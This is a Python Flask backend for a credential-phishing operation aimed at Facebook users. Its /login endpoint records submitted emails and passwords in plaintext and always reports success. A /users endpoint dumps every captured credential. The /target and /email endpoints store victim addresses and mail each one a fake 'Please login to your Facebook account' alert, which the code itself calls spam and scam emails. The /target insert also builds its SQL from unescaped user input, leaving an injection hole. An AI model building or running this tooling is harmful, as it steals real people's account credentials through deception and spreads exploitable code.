from flask import Flask,request
from flask_mysqldb import MySQL
from flask_cors import CORS, cross_origin
import email_utility
import yaml, json

app = Flask(__name__)
CORS(app, support_credentials=True)

with open('db.yaml', 'r') as file:
    db = yaml.safe_load(file)
app.config['MYSQL_HOST'] = db['mysql_host']
app.config['MYSQL_USER'] = db['mysql_user']
app.config['MYSQL_PASSWORD'] = db['mysql_password']
app.config['MYSQL_DB'] = db['mysql_db']

mysql = MySQL(app)

if __name__ == '__main__':
    app.run(debug=True)

@app.route("/health", methods=['GET'])
def health():
    return {"response": "Server is up!"}

@app.route("/db-setup", methods=['GET'])
def databaseSetup():
    cur = mysql.connection.cursor()

    cur.execute("""
    CREATE TABLE IF NOT EXISTS users(
        email VARCHAR(255),
        password VARCHAR(255)
    )""")

    cur.execute("""
    CREATE TABLE IF NOT EXISTS targets(
        id int NOT NULL AUTO_INCREMENT,
        email VARCHAR(255),
        UNIQUE(email),
        PRIMARY KEY (id)
    )""")

    mysql.connection.commit()
    cur.close()
    return {"response": "Database setup successfully"}

@app.route("/login", methods=['POST', 'GET'])
@cross_origin(supports_credentials=True)
def login():

    if request.method == 'POST':

        data = json.loads(request.data)

        email = data.get('email')
        password = data.get('password')

        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO users(email, password) VALUES(%s,%s)",
                    (email, password))

        mysql.connection.commit()
        cur.close()

    return {"response": "Success!"}


@app.route('/users', methods = ['GET', 'POST'])
def users():
    cur = mysql.connection.cursor()

    result = cur.execute("SELECT * FROM users")
    json_data = []
    if result > 0:
        row_headers = [x[0] for x in cur.description]  # this will extract
        # row headers
        rv = cur.fetchall()
        for result in rv:
            json_data.append(dict(zip(row_headers, result)))
    cur.close()
    return json.dumps(json_data)



@app.route("/target", methods=['POST', 'GET'])
def target():
    cur = mysql.connection.cursor()

    if request.method == 'POST':

        data = json.loads(request.data)

        target_email = data.get('email')

        result = cur.execute(f"INSERT INTO targets (id, email) VALUES (null, '{target_email}')")

        mysql.connection.commit()
        cur.close()
        return {"response": "target table insert successfull",
                "data": target_email}
    elif request.method == 'GET':
        cur.execute("SELECT * FROM targets")

        col_names = [col[0] for col in cur.description]
        result = [dict(zip(col_names, row)) for row in cur.fetchall()]
        print(result)
        cur.close()
        return {"response": "Successfully fetched all target emails",
                "data": result}

@app.route("/email", methods=['POST'])
def email():
    cur = mysql.connection.cursor()

    # Get the targets in the MySQL DB
    query = cur.execute("SELECT email FROM targets")
    col_names = [col[0] for col in cur.description]
    targets = [dict(zip(col_names, row)) for row in cur.fetchall()]

    # Send the spam email to each of the targets
    for i in range(len(targets)):
        print(targets[i]["email"])
        email_utility.send_email(targets[i]["email"], "ALERT: Please login to your Facebook account")

    cur.close()
    return {"response": "Successfully send scam emails",
                "targets": targets}

